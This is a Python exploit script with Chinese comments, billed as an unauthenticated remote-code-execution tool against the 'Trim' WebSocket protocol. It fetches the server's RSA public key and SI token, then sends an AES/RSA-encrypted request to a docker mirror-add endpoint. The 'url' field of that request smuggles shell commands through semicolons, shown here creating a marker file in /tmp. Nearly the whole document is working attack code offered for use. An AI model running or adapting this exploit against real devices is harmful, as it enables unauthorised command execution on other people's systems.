import websocket
import json
import time
import base64
import argparse
import sys
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5, AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

# --- 目标配置 ---
TARGET_URL = "ws://192.168.108.168:5666/websocket?type=main"

# 攻击负载
CMD_TO_EXECUTE = "/usr/bin/touch /tmp/hacked_via_encrypted_channel"
EXPLOIT_PAYLOAD_URL = f"https://test1145.example.com ; {CMD_TO_EXECUTE} ; /usr/bin/echo "

class TrimEncryptedExploit:
    def __init__(self):
        self.ws = None
        self.si = ""
        self.server_pub_key = ""
        self.step = 0

    def get_reqid(self):
        return str(int(time.time() * 100000))

    def create_encrypted_packet(self, inner_json_dict):
        """
        构造 { "req": "encrypted", ... } 数据包
        """
        try:
            # 1. 生成临时的 AES-256 Key 和 IV
            aes_key = get_random_bytes(32)
            aes_iv = get_random_bytes(16)
            
            # 2. 序列化内部 Payload
            # 注意：separators 去除空格
            inner_data = json.dumps(inner_json_dict, separators=(',', ':')).encode('utf-8')
            
            # 3. AES 加密 Payload (CBC + PKCS7 Padding)
            cipher_aes = AES.new(aes_key, AES.MODE_CBC, aes_iv)
            encrypted_body = cipher_aes.encrypt(pad(inner_data, AES.block_size))
            
            # 4. RSA 加密 AES Key (使用服务器公钥)
            # 这样服务器收到后，能用它的私钥解出我们的 AES Key
            rsa_key_obj = RSA.import_key(self.server_pub_key)
            cipher_rsa = PKCS1_v1_5.new(rsa_key_obj)
            encrypted_aes_key = cipher_rsa.encrypt(aes_key)
            
            # 5. 组装最终包
            wrapper = {
                "req": "encrypted",
                # "reqid": self.get_reqid(), # 外层通常不需要 reqid，如果需要可取消注释
                "iv": base64.b64encode(aes_iv).decode('utf-8'),
                "rsa": base64.b64encode(encrypted_aes_key).decode('utf-8'),
                "aes": base64.b64encode(encrypted_body).decode('utf-8')
            }
            
            return json.dumps(wrapper, separators=(',', ':'))
            
        except Exception as e:
            print(f"❌ 加密构造失败: {e}")
            return None

    def on_open(self, ws):
        print(f"\n[1/2] 连接建立，请求公钥...")
        # 步骤 1: 拿公钥和 SI
        payload = {
            "reqid": self.get_reqid(),
            "req": "util.crypto.getRSAPub"
        }
        ws.send(json.dumps(payload))
        self.step = 1

    def on_message(self, ws, message):
        try:
            # 简单解析
            if message.startswith('{'):
                data = json.loads(message)
            elif message.find('{') > -1:
                data = json.loads(message[message.find('{'):])
            else:
                return

            # --- 步骤 1: 获取公钥和 SI ---
            if self.step == 1 and "pub" in data:
                self.server_pub_key = data["pub"]
                self.si = str(data["si"])
                print(f"✅ [1/2] 握手成功")
                print(f"    SI: {self.si}")
                print(f"    Pub Key 获取成功 ({len(self.server_pub_key)} bytes)")
                
                # --- 步骤 2: 发送加密的 Exploit ---
                self.send_exploit(ws)
                self.step = 2
                return

            # --- 步骤 2: 接收结果 ---
            if self.step == 2:
                print(f"\n💣 [2/2] 收到响应:\n{json.dumps(data, indent=2)}")
                
                if data.get("result") == "succ" or data.get("errno") == 0:
                    print(f"\n[+] 攻击成功！命令已通过加密通道发送。")
                    print(f"[+] 请检查服务器文件: {CMD_TO_EXECUTE}")
                else:
                    print(f"\n[-] 攻击失败，错误码: {data.get('errno')}")
                
                ws.close()

        except Exception as e:
            print(f"❌ 异常: {e}")
            ws.close()

    def send_exploit(self, ws):
        print(f"\n[*] 正在构造加密 Exploit 包...")
        print(f"[*] 注入命令: {CMD_TO_EXECUTE}")
        
        inner_payload = {
            "req": "appcgi.dockermgr.systemMirrorAdd",
            "reqid": self.get_reqid(),
            "url": EXPLOIT_PAYLOAD_URL,
            "name": "EncryptedExploit",
            "si": self.si
        }
        
        print(f"[*] 内部 Payload: {json.dumps(inner_payload)}")
        
        packet = self.create_encrypted_packet(inner_payload)
        
        if packet:
            print(f"[>] 发送加密包 (Len: {len(packet)})...")
            ws.send(packet)

    def run(self):
        self.ws = websocket.WebSocketApp(TARGET_URL,
                                         on_open=self.on_open,
                                         on_message=self.on_message)
        self.ws.run_forever()

if __name__ == "__main__":
    print("=== Trim 协议加密通道未授权 RCE 利用工具 ===")
    exploit = TrimEncryptedExploit()
    exploit.run()